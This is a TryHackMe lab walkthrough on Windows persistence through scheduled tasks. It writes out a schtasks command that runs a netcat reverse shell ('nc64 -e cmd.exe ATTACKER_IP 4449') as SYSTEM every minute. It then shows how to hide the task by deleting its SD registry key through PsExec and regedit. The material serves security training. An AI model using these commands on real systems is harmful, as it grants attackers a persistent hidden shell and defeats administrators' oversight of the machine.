## Room : [Windows Local Persistence - Abusing Scheduled Tasks](https://tryhackme.com/room/windowslocalpersistence)

We will be using the built-in **Windows task scheduler**
Using command: `schtasks`

- Create a task that runs every minute
`schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM`

**Note**: keep the name "THM-TaskBackdoor" intact, do not change it, else the flag won't be retrieved

The script is scheduled to run with SYSTEM privileges

- Check for the schedule
`schtasks /query /tn thm-taskbackdoor`

- Keep the listener on for the port 4449 and you will get a shell in a minute

![WLP25](/img/WLP25.png)

- Now lets make our task invisible so that our cover is not blown if someone checks.
- Run the command on the machine: 
`c:\tools\pstools\PsExec64.exe -s -i regedit`

- Delete the **SD** key on the victim machine

![WLP26](/img/WLP26.png)

- Once deleted, the schedule wont be visible, check by running the command (or check task scheduler):

`schtasks /query /tn thm-taskbackdoor`

![WLP27](/img/WLP27.png)

- Keep the listener running on the port 4449 and you will get a shell in some time. Retrieve the `flag9.exe`

![WLP29](/img/WLP29.png)